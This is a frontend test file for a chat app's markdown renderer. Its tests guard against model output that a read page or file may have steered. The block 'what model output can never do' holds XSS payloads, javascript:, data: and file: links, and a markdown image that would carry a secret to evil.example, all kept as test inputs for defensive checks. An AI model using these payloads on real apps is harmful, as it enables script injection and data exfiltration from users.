/**
 * An assistant's reply is markdown, and is shown as formatting (#440).
 *
 * Claude writes `**bold**`, `- ` lists, `code` and fenced blocks; the
 * bubble printed the symbols. The owner saw `- **Fade:** …` with its
 * asterisks in a demo video.
 *
 * Three things are pinned here, and the second is the one that matters
 * most. The text being rendered is model output, which a page or a file
 * the model read can steer:
 *
 *   1. what renders as what — and that the *user's* side does not, since
 *      what someone typed is theirs;
 *   2. what must never render — an HTML tag from the model becomes text
 *      and not an element, a link never becomes something the webview
 *      can navigate to, an image is never fetched;
 *   3. that a reply cut off mid-syntax, which is every reply for most of
 *      the time it is arriving, renders without throwing.
 */

import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { MessageBubble } from "../components/MessageBubble";

function bubble(
  text: string,
  props: { role?: "user" | "assistant"; pending?: boolean } = {},
): HTMLElement {
  render(
    <MessageBubble
      role={props.role ?? "assistant"}
      text={text}
      pending={props.pending}
    />,
  );
  return screen.getByTestId("message-bubble");
}

describe("an assistant message is rendered as markdown", () => {
  it("renders **bold** as <strong>, without the asterisks", () => {
    const el = bubble("Applied a **fade** to the intro.");
    const strong = el.querySelector("strong");
    expect(strong?.textContent).toBe("fade");
    expect(el.textContent).toBe("Applied a fade to the intro.");
  });

  it("renders *italic* as <em>", () => {
    expect(bubble("a *soft* edge").querySelector("em")?.textContent).toBe(
      "soft",
    );
  });

  it("renders a dash list as list items, not as dashes", () => {
    const el = bubble("- a\n- b");
    expect(el.querySelector("ul")).not.toBeNull();
    expect(
      Array.from(el.querySelectorAll("li")).map((li) => li.textContent),
    ).toEqual(["a", "b"]);
    expect(el.textContent).not.toContain("-");
  });

  it("renders a numbered list as an <ol>", () => {
    const el = bubble("1. load\n2. trim\n3. export");
    expect(el.querySelectorAll("ol > li")).toHaveLength(3);
  });

  /** The line from the demo video. */
  it("renders a bold lead-in inside a list item", () => {
    const el = bubble("- **Fade:** smooths the start\n- **Trim:** removes silence");
    const items = Array.from(el.querySelectorAll("li"));
    expect(items.map((li) => li.querySelector("strong")?.textContent)).toEqual([
      "Fade:",
      "Trim:",
    ]);
    expect(el.textContent).not.toContain("*");
  });

  it("renders `inline code` as <code> outside any <pre>", () => {
    const el = bubble("Run `normalize` first.");
    const code = el.querySelector("code");
    expect(code?.textContent).toBe("normalize");
    expect(el.querySelector("pre")).toBeNull();
  });

  it("renders a fenced block as <pre><code>, verbatim", () => {
    const el = bubble("Try:\n\n```json\n{ \"gain\": -3 }\n```\n\nThen listen.");
    const pre = el.querySelector("pre");
    expect(pre).not.toBeNull();
    expect(pre?.querySelector("code")?.textContent).toBe('{ "gain": -3 }\n');
  });

  it("does not format inside a code block", () => {
    const el = bubble("```\n**not bold** and - not a list\n```");
    expect(el.querySelector("strong")).toBeNull();
    expect(el.querySelector("li")).toBeNull();
    expect(el.querySelector("pre")?.textContent).toContain("**not bold**");
  });

  it("renders headings as headings", () => {
    const el = bubble("# One\n\n## Two\n\n### Three");
    expect(el.querySelector("h1")?.textContent).toBe("One");
    expect(el.querySelector("h2")?.textContent).toBe("Two");
    expect(el.querySelector("h3")?.textContent).toBe("Three");
  });

  it("renders paragraphs, and keeps a single newline as a line break", () => {
    const el = bubble("First.\n\nSecond line one\nSecond line two");
    const paragraphs = el.querySelectorAll("p");
    expect(paragraphs).toHaveLength(2);
    // A reply that was one thing per line stays one thing per line.
    expect(paragraphs[1].querySelectorAll("br")).toHaveLength(1);
  });

  it("renders a GFM table inside a wrapper that scrolls by itself", () => {
    const el = bubble("| Tool | Use |\n| --- | --- |\n| fade | smooth |");
    const table = el.querySelector("table");
    expect(table).not.toBeNull();
    expect(table?.parentElement).toHaveClass("chat-md-table");
    expect(
      Array.from(el.querySelectorAll("th")).map((th) => th.textContent),
    ).toEqual(["Tool", "Use"]);
    expect(el.querySelector("td")?.textContent).toBe("fade");
  });

  it("renders GFM strikethrough and task lists", () => {
    const el = bubble("~~old~~\n\n- [x] done\n- [ ] todo");
    expect(el.querySelector("del")?.textContent).toBe("old");
    expect(el.querySelectorAll('input[type="checkbox"]')).toHaveLength(2);
  });

  it("still trims the blank lines the model opened and closed with", () => {
    const el = bubble("\n\n\n**Done.**\n\n");
    expect(el.textContent).toBe("Done.");
  });
});

describe("the user's message is shown as typed", () => {
  it("leaves **asterisks** alone", () => {
    const el = bubble("make it **not bold**", { role: "user" });
    expect(el.textContent).toBe("make it **not bold**");
    expect(el.querySelector("strong")).toBeNull();
  });

  it("does not turn a typed list into a list", () => {
    const el = bubble("- a\n- b", { role: "user" });
    expect(el.querySelector("li")).toBeNull();
    expect(el.textContent).toBe("- a\n- b");
  });

  it("does not turn typed backticks or HTML into elements", () => {
    const el = bubble("use `gain` <b>now</b>", { role: "user" });
    expect(el.querySelector("code")).toBeNull();
    expect(el.querySelector("b")).toBeNull();
    expect(el.textContent).toBe("use `gain` <b>now</b>");
  });

  it("is still pre-wrapped, so its own line breaks show", () => {
    const el = bubble("one\ntwo", { role: "user" });
    const text = el.querySelector("[class*='whitespace-pre-wrap']");
    expect(text).not.toBeNull();
    expect(text?.textContent).toBe("one\ntwo");
  });

  it("keeps its streaming caret, as before", () => {
    const el = bubble("typing", { role: "user", pending: true });
    expect(el.querySelector('[data-testid="caret"]')).not.toBeNull();
  });
});

/**
 * What the model says is not trusted. These are the cases that would turn
 * a chat reply into code running in, or navigating, the app's webview.
 */
describe("what model output can never do", () => {
  it("does not turn an HTML tag into an element", () => {
    const html = "<img src=x onerror=alert(1)>";
    const el = bubble(`Look: ${html} done.`);
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector("[onerror]")).toBeNull();
    // It is kept, as text, so nothing the model said is silently lost.
    expect(el.textContent).toContain(html);
  });

  it("does not turn a block of HTML into elements either", () => {
    const html = "<img src=x onerror=alert(1)>";
    const el = bubble(html);
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector("[onerror]")).toBeNull();
    expect(el.textContent).toBe(html);
  });

  it("does not run or create <script>, <iframe> or <style> from the text", () => {
    const el = bubble(
      "<script>alert(1)</script>\n\n<iframe src=\"https://evil.example\"></iframe>\n\n<style>body{display:none}</style>",
    );
    expect(el.querySelector("script, iframe, style, object, embed")).toBeNull();
  });

  it("does not let an HTML comment or entity smuggle markup", () => {
    const el = bubble("a <!-- <img src=x onerror=alert(1)> --> b &lt;b&gt;");
    expect(el.querySelector("img, b")).toBeNull();
  });

  it("never emits an <a>, so a link cannot navigate the webview", () => {
    const el = bubble("See [the docs](https://example.com/guide) for more.");
    expect(el.querySelector("a")).toBeNull();
    expect(el.querySelector("[href]")).toBeNull();
    // The destination is shown, so a link cannot hide where it goes.
    expect(el.textContent).toBe(
      "See the docs (https://example.com/guide) for more.",
    );
  });

  it("shows a bare URL once, and as text", () => {
    const el = bubble("Get it at https://example.com/get now");
    expect(el.querySelector("a, [href]")).toBeNull();
    expect(el.textContent).toBe("Get it at https://example.com/get now");
  });

  it("shows an <https://…> autolink once", () => {
    const el = bubble("<https://example.com/x>");
    expect(el.querySelector("a, [href]")).toBeNull();
    expect(el.textContent).toBe("https://example.com/x");
  });

  it("drops the target of a javascript: link, keeping only its text", () => {
    const el = bubble("[click me](javascript:alert(1))");
    expect(el.querySelector("a, [href]")).toBeNull();
    expect(el.textContent).toBe("click me");
    expect(el.textContent).not.toContain("javascript");
  });

  it("drops the target of a data: or file: link", () => {
    const el = bubble(
      "[a](data:text/html;base64,PHNjcmlwdD4=) [b](file:///etc/passwd)",
    );
    expect(el.querySelector("a, [href]")).toBeNull();
    expect(el.textContent).toBe("a b");
  });

  it("never fetches an image; it shows the alt text", () => {
    const el = bubble("![a chart](https://evil.example/pixel.png?q=secret)");
    expect(el.querySelector("img, [src]")).toBeNull();
    expect(el.textContent).toBe("a chart");
  });

  it("does not load an image through the asset protocol either", () => {
    const el = bubble("![x](asset://localhost/%2Fhome%2Fme%2Fkey)");
    expect(el.querySelector("img, [src]")).toBeNull();
  });
});

/**
 * A reply is re-parsed from its first character on every delta, so for
 * most of its life it ends mid-syntax.
 */
describe("a reply that is still arriving", () => {
  it("renders an unclosed ** without throwing", () => {
    const el = bubble("Applying a **fad", { pending: true });
    expect(el.textContent).toContain("Applying a ");
    expect(el.textContent).toContain("fad");
    expect(el.querySelector('[data-testid="caret"]')).not.toBeNull();
  });

  it("renders a code fence that has not been closed as a code block", () => {
    const el = bubble("Try:\n\n```json\n{ \"gain\":", { pending: true });
    expect(el.querySelector("pre code")?.textContent).toContain('{ "gain":');
  });

  it("renders a fence that is only its opening backticks", () => {
    expect(() => bubble("Try:\n\n```", { pending: true })).not.toThrow();
  });

  it("renders an unclosed backtick, link and table", () => {
    for (const text of [
      "Use `norm",
      "See [the do",
      "See [the docs](https://exa",
      "| a | b |\n| --",
      "> quoted",
      "1.",
      "-",
    ]) {
      expect(() => {
        const { unmount } = render(
          <MessageBubble role="assistant" text={text} pending />,
        );
        unmount();
      }, text).not.toThrow();
    }
  });

  /**
   * The strongest check available: every prefix of a message that uses
   * every construct — which is what the bubble is shown while it types —
   * renders, and has exactly one caret.
   */
  it("renders every prefix of a rich message, each with one caret", () => {
    const full = [
      "# Plan",
      "",
      "I will **fade** the *intro* and run `normalize`:",
      "",
      "- **Fade:** smooths the start",
      "- **Trim:** removes silence",
      "  - nested [docs](https://example.com)",
      "",
      "1. first",
      "2. second",
      "",
      "> a note",
      "",
      "| Tool | Use |",
      "| --- | --- |",
      "| fade | smooth |",
      "",
      "```json",
      '{ "gain": -3 }',
      "```",
      "",
      "Done <b>x</b> ![img](https://e.example/a.png)",
    ].join("\n");

    for (let n = 0; n <= full.length; n++) {
      const { container, unmount } = render(
        <MessageBubble role="assistant" text={full.slice(0, n)} pending />,
      );
      expect(
        container.querySelectorAll('[data-testid="caret"]'),
        `prefix of ${n} chars`,
      ).toHaveLength(1);
      expect(container.querySelector("a, img, script, [onerror]")).toBeNull();
      unmount();
    }
    // ~400 renders, each building a markdown pipeline: seconds on a busy
    // machine, so the default 5 s is too tight to be honest.
  }, 60_000);

  /**
   * The caret used to be the last character of the bubble's one string.
   * It has to stay on the last line of text rather than drop below the
   * block, or it jumps down and up as the reply grows.
   */
  it("keeps the caret at the end of the last line, inside its paragraph", () => {
    const el = bubble("First.\n\nSecond, still typ", { pending: true });
    const caret = el.querySelector('[data-testid="caret"]');
    expect(caret?.parentElement?.tagName).toBe("P");
    expect(caret?.parentElement?.textContent).toBe("Second, still typ");
  });

  it("keeps the caret inside the last list item", () => {
    const el = bubble("- a\n- b is typ", { pending: true });
    const caret = el.querySelector('[data-testid="caret"]');
    expect(caret?.closest("li")?.textContent).toBe("b is typ");
  });

  it("puts the caret after a code block when the reply ends in one", () => {
    const el = bubble("```\nls", { pending: true });
    const caret = el.querySelector('[data-testid="caret"]');
    expect(caret).not.toBeNull();
    expect(el.querySelector("pre")?.contains(caret)).toBe(false);
  });

  it("is hidden from assistive tech, and has no text", () => {
    const el = bubble("typing", { pending: true });
    const caret = el.querySelector('[data-testid="caret"]');
    expect(caret).toHaveAttribute("aria-hidden", "true");
    expect(caret?.textContent).toBe("");
  });

  /**
   * `Fade:` followed by a lone `-` is, to markdown, a heading with an
   * underline — for exactly the delta between the dash and the words
   * after it. That flashed a large bold heading in the middle of a list.
   */
  it("does not flash a heading when a list's dash arrives on its own", () => {
    for (const text of ["Options:\n-", "Options:\n- ", "Options:\n=", "Options:\n---"]) {
      const { container, unmount } = render(
        <MessageBubble role="assistant" text={text} pending />,
      );
      expect(container.querySelector("h1, h2"), JSON.stringify(text)).toBeNull();
      expect(container.textContent).toContain("Options:");
      unmount();
    }
  });

  it("does read the same text as a heading once the reply is finished", () => {
    const { container } = render(
      <MessageBubble role="assistant" text={"Options\n---"} />,
    );
    expect(container.querySelector("h2")?.textContent).toBe("Options");
  });

  it("shows nothing but the caret before any text has arrived", () => {
    const el = bubble("", { pending: true });
    expect(el.textContent).toBe("");
    expect(el.querySelector('[data-testid="caret"]')).not.toBeNull();
  });

  it("settles to the same markup when the stream ends, minus the caret", () => {
    const text = "Done: **ok**\n\n- a\n- b";
    const { container, rerender } = render(
      <MessageBubble role="assistant" text={text} pending />,
    );
    rerender(<MessageBubble role="assistant" text={text} />);
    expect(container.querySelector('[data-testid="caret"]')).toBeNull();
    expect(container.querySelector("strong")?.textContent).toBe("ok");
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });
});
